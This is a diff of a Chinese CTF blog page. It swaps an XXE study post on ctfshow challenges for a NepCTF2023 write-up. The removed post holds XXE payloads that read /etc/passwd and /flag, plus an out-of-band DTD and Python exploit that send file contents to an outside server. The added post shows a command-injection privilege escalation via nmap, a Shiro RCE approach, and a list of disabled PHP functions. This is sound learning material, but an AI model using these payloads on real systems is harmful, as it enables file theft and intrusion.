@@ -13,22 +13,28 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://yan5ui.github.io/2023/08/05/xxe/"/>
+    <link rel="canonical" href="http://yan5ui.github.io/2023/10/24/nep2023/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="XXE漏洞学习与总结">
+        <meta name="description" content="NepCTF2023">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XXE漏洞学习与总结">
-<meta property="og:url" content="http://yan5ui.github.io/2023/08/05/XXE/index.html">
+<meta property="og:title" content="NepCTF2023 wp">
+<meta property="og:url" content="http://yan5ui.github.io/2023/10/24/Nep2023/index.html">
 <meta property="og:site_name" content="yansui&#39;s blogs">
-<meta property="og:description" content="XXE漏洞学习与总结">
+<meta property="og:description" content="NepCTF2023">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-08-05T13:09:08.230Z">
-<meta property="article:modified_time" content="2023-08-06T12:22:33.975Z">
+<meta property="og:image" content="http://yan5ui.github.io/2023-08-11-22-59-04.png">
+<meta property="og:image" content="http://yan5ui.github.io/2023-08-11-23-00-37.png">
+<meta property="og:image" content="http://yan5ui.github.io/2023-08-12-10-08-14.png">
+<meta property="og:image" content="http://yan5ui.github.io/2023-08-13-15-57-47.png">
+<meta property="og:image" content="http://yan5ui.github.io/2023-08-13-15-29-23.png">
+<meta property="article:published_time" content="2023-10-24T02:37:05.936Z">
+<meta property="article:modified_time" content="2023-10-24T02:36:57.353Z">
 <meta property="article:author" content="yansui">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yan5ui.github.io/2023-08-11-22-59-04.png">
     
     
     <!--- Icon Part-->
@@ -40,7 +46,7 @@
     
     <title>
         
-            XXE漏洞学习与总结 -
+            NepCTF2023 wp -
         
         yansui&#39;s blogs
     </title>
@@ -202,7 +208,7 @@
 
         <div class="article-title">
             
-                <h1 class="article-title-regular">XXE漏洞学习与总结</h1>
+                <h1 class="article-title-regular">NepCTF2023 wp</h1>
             
             </div>
             
@@ -224,15 +230,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-08-05 21:09:08</span>
-        <span class="mobile">2023-08-05 21:09:08</span>
+        <span class="desktop">2023-10-24 10:37:05</span>
+        <span class="mobile">2023-10-24 10:37:05</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-08-06 20:22:33</span>
-            <span class="mobile">2023-08-06 20:22:33</span>
+            <span class="desktop">2023-10-24 10:36:57</span>
+            <span class="mobile">2023-10-24 10:36:57</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -256,59 +262,91 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="XXE漏洞学习与总结"><a href="#XXE漏洞学习与总结" class="headerlink" title="XXE漏洞学习与总结"></a>XXE漏洞学习与总结</h1><span id="more"></span>
+            <h1 id="NepCTF2023"><a href="#NepCTF2023" class="headerlink" title="NepCTF2023"></a>NepCTF2023</h1><span id="more"></span>
 
-<h2 id="一、什么事XXE"><a href="#一、什么事XXE" class="headerlink" title="一、什么事XXE"></a>一、什么事XXE</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-intro.html" >先得好好学学啥叫XML <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-19" >再来学啥事XXE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>我发现想在介绍XXE的文章里边看懂啥叫实体啥叫参数实体是一件不可能的事情</p>
-<h2 id="二、CTFSHOW题解"><a href="#二、CTFSHOW题解" class="headerlink" title="二、CTFSHOW题解"></a>二、CTFSHOW题解</h2><h3 id="Web373"><a href="#Web373" class="headerlink" title="Web373"></a>Web373</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>从payload all the things里边偷一个payload:</p>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">data</span> (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>改一下：（根元素不能是ctfshow）</p>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>这题做的不明不白的</p>
-<h3 id="Web374"><a href="#Web374" class="headerlink" title="Web374"></a>Web374</h3><p>最后还是抄了yu22x师傅的wp</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/112347932" >https://blog.csdn.net/miuzzx/article/details/112347932v <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>vps上起Apache服务参考了<a class="link"   target="_blank" rel="noopener" href="https://www.west.cn/docs/421537.html" >https://www.west.cn/docs/421537.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>稍微看看具体原理：</p>
-<p>有关%即参数实体：</p>
+<h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>Audacity打开 前一段莫斯,后一段十六进制<br>后一段是 0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p>
+<h2 id="huffman"><a href="#huffman" class="headerlink" title="huffman"></a>huffman</h2><p>来自糖醋小鸡块师傅：</p>
 <blockquote>
-<p>在XML文件中，如果一个实体名前面带有百分号（%），则表示这是一个参数实体（Parameter Entity）。XML中的实体是用来表示特定字符、字符串或文本片段的声明。实体的目的是为了方便在XML文档中引用一些特殊字符或重复使用一些文本片段。<br>有两种类型的实体：一般实体（General Entity）和参数实体（Parameter Entity）。它们的声明方式稍有不同：<br>一般实体（General Entity）：一般实体用于表示单个字符或文本片段，并且在DTD（Document Type Definition）或XML文档中用&amp;实体名;来引用。一般实体以&amp;开头，以;结尾，例如：&amp;lt;表示小于符号 &lt;。<br>参数实体（Parameter Entity）：参数实体用于定义一组实体，它通常在DTD中使用。在DTD中，参数实体的声明以百分号（%）开头，以分号（;）结尾，例如：&lt;!ENTITY % myEntity “Hello, World!”&gt;。参数实体本身不会被引用，但可以在其他实体或DTD中使用。</p>
+<p>加密文件前面是字典<br>我直接猜huffman_zip_666</p>
 </blockquote>
-<p>payload引用实体aaa-&gt;aaa引用DTD-&gt;DTD引用xxe-&gt;xxe引用file-&gt;file读取flag</p>
-<p>test.dtd:</p>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://xxx:9999/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure></div>
+<h2 id="ez-java-login"><a href="#ez-java-login" class="headerlink" title="ez_java_login"></a>ez_java_login</h2><p>先是弱口令admin:admin</p>
+<p>登录之后抓包看RememberMe:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2023-08-11-22-59-04.png"
+                     
+                ></p>
+<p>直接用工具可以RCE:<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack/releases/tag/2.2" >**** <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>直接cat &#x2F;start.sh就行，flag写死了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2023-08-11-23-00-37.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepcTF&#123;Ezjava_Chekin&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>payload:</p>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">aaa</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>123<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a>独步天下-转生成为镜花水月中的王者</h2><p>nc链接靶机直接可以看到flag，但是没有权限读<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2023-08-12-10-08-14.png"
+                     
+                ></p>
+<p>提示说环境变量提权，去学习一下：</p>
+<p>赛后复现：</p>
+<p>看第一名的大佬说可以nmap提权：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &quot;asd;sh&quot;</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="Web375"><a href="#Web375" class="headerlink" title="Web375"></a>Web375</h3><p>直接不写XML文件的版本号就行</p>
-<h3 id="Web376"><a href="#Web376" class="headerlink" title="Web376"></a>Web376</h3><p>跟上一题一样 梭哈了</p>
-<h3 id="Web377"><a href="#Web377" class="headerlink" title="Web377"></a>Web377</h3><p>payload其实和上面的题目一样，使用UTF-16来bypass对http的黑名单</p>
-<p>exp:</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://77e47474-e964-47c7-9ab6-9cfd982addeb.challenge.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://121.37.219.181/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">requests.post(url ,data=payload)</span><br></pre></td></tr></table></figure></div>
+<p>这个命令是什么意思呢？</p>
+<p>服了，要本地搭环境，还必须在Linux下，配环境搞了一天</p>
+<h2 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h2><p>感觉像是XSS</p>
+<p>赛后复现：<br><a class="link"   target="_blank" rel="noopener" href="https://inhann.top/2023/03/26/ejs/" >跟着做做代码审计 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h2><p>还有三个半小时，就做做这个好了</p>
+<p>没啥思路 先上dirsearch</p>
+<p>先看<a class="link"   target="_blank" rel="noopener" href="http://nepctf.1cepeak.cn:31854/jump.php?hint" >http://nepctf.1cepeak.cn:31854/jump.php?hint <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>拿到一部分代码：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$jump_link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;link&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$jump_link</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$jump_link</span>. <span class="string">&quot;.txt&quot;</span>); <span class="comment">// More info? See &quot;/var/www/html/hint.ini&quot; or &quot;./hint.ini&quot;</span></span><br><span class="line">    </span><br><span class="line">&#125;  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$jump_link</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">所以到底来没来? 且看 /<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)<span class="meta">?&gt;</span>?hint</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
-<h3 id="Web378"><a href="#Web378" class="headerlink" title="Web378"></a>Web378</h3><p>抓个包就知道怎么做啦</p>
-<p>payload:</p>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>hint.ini是一个类似phpinfo的东西，也不知道哪里有用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2023-08-13-15-57-47.png"
+                     
+                ></p>
+<p>试了试条件竞争做session文件包含，但是也不行</p>
+<p>是Filter chain</p>
+<p>有<br>disable_functions &#x3D; fpassthru,fgetss,fgets,fopen,fread,show_souce,stream_socket_client,fsockopen,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,pfsockopen,readfile,file_get_contents,file_put_contents,fputs,fwrite,delete,rmdir,rename,chgrp,chmod,chown,copy,chdir,mkdir,file,chroot,assert,dl,move_upload_file,sysmlink,readlink,curl_init,curl_exec</p>
+<h2 id="Codes"><a href="#Codes" class="headerlink" title="Codes"></a>Codes</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** a,<span class="type">char</span>** b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!b[i])</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(b[i]);</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>main函数的第三个参数就是环境变量</p>
+<h2 id="三月七"><a href="#三月七" class="headerlink" title="三月七"></a>三月七</h2><p>salt就是群名，key是SHA256之后的群名</p>
+<p>HRP_aIways_lIke_March_7th</p>
+<p>NepCTF{HRP_aIways_likes_March_7th}</p>
+<h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>手动下棋就行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2023-08-13-15-29-23.png"
+                     
+                ></p>
+
         </div>
 
         
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> XXE漏洞学习与总结</li>
+        <li><strong>标题:</strong> NepCTF2023 wp</li>
         <li><strong>作者:</strong> yansui</li>
-        <li><strong>创建于:</strong> 2023-08-05 21:09:08</li>
+        <li><strong>创建于:</strong> 2023-10-24 10:37:05</li>
         
             <li>
-                <strong>更新于:</strong> 2023-08-06 20:22:33
+                <strong>更新于:</strong> 2023-10-24 10:36:57
             </li>
         
         <li>
-            <strong>链接:</strong> http://yansui.xyz/2023/08/05/XXE/
+            <strong>链接:</strong> http://yansui.xyz/2023/10/24/Nep2023/
         </li>
         <li>
             <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
@@ -326,29 +364,14 @@
         
             <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2023/08/07/SSTI/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">SSTI</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                         rel="next"
-                        href="/2023/08/03/SSRF/"
+                        href="/2023/10/24/moectf/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">SSRF学习笔记</span>
+                                <span class="post-nav-title-item">moeCTF2023 wp</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -413,8 +436,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">此页目录</div>
-        <div class="page-title">XXE漏洞学习与总结</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93"><span class="nav-text">XXE漏洞学习与总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E4%BA%8BXXE"><span class="nav-text">一、什么事XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81CTFSHOW%E9%A2%98%E8%A7%A3"><span class="nav-text">二、CTFSHOW题解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web373"><span class="nav-text">Web373</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web374"><span class="nav-text">Web374</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web375"><span class="nav-text">Web375</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web376"><span class="nav-text">Web376</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web377"><span class="nav-text">Web377</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web378"><span class="nav-text">Web378</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">NepCTF2023 wp</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NepCTF2023"><span class="nav-text">NepCTF2023</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E5%8F%AE%E5%BC%B9%E9%92%A2%E7%90%B4"><span class="nav-text">小叮弹钢琴</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#huffman"><span class="nav-text">huffman</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-java-login"><span class="nav-text">ez_java_login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E8%BD%AC%E7%94%9F%E6%88%90%E4%B8%BA%E9%95%9C%E8%8A%B1%E6%B0%B4%E6%9C%88%E4%B8%AD%E7%9A%84%E7%8E%8B%E8%80%85"><span class="nav-text">独步天下-转生成为镜花水月中的王者</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Post-Crad-For-You"><span class="nav-text">Post Crad For You</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ez-include"><span class="nav-text">Ez_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Codes"><span class="nav-text">Codes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E6%9C%88%E4%B8%83"><span class="nav-text">三月七</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ConnectedFive"><span class="nav-text">ConnectedFive</span></a></li></ol></li></ol>
 
     </div>
 </div>
